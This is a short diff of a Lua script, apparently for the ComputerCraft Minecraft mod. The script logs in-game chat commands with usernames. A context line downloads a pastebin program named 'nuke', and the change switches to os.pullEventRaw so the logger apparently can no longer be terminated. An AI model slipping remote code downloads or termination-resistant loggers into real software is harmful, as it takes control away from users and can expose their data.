@@ -13,16 +13,12 @@ shell.run("pastebin get GDejrHh4 nuke")
 --
 function listener()
     while true do
-        local tEvent = {os.pullEvent()}
+        local tEvent = {os.pullEventRaw()}
 		if tEvent[1] == "chat_command" then
 			mesg = tostring(tEvent[2])
 			user = tostring(tEvent[3])
 			total = user..': '..mesg
 			table.insert(messages,total)
-			table.remove(messages, 1)
-		else if tEvent[1] == "Terminated" then
-				shell.run("rm","startup")
-			end
 		end	
 	end
 end
